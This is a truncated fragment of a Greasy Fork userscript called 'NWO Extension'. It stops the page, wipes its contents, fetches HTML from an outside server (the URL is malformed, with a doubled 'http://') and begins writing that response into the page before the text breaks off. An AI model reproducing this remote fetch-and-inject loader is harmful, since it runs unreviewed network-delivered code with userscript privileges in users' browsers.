...
// @downloadURL https://update.greasyfork.org/scripts/16340/NWO%20Extension.user.js
// @updateURL https://update.greasyfork.org/scripts/16340/NWO%20Extension.meta.js
// ==/UserScript==

window.stop()
document.documentElement.innerHTML = null

GM_xmlhttpRequest({method: 'GET', url: 'http://http://xextension.com/NWOExtensionScript.html',
onload: function(r) {
document.open()
